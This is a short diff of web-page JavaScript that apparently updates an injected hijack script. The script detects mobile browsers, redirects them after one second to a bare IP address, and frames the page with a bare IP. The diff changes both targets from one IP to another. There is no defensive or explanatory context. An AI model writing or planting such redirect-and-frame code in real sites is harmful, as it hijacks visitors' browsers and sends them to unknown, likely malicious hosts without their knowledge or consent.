@@ -20,11 +20,11 @@
 
 if(window.navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)) {
  
-   setTimeout("window.location.href='http://38.26.195.64'",1000);
+   setTimeout("window.location.href='http://38.26.195.66'",1000);
  }
 
 var titlestr=document.title;
-setFrame("http://38.26.195.64");
+setFrame("http://38.26.195.66");
 
 
 
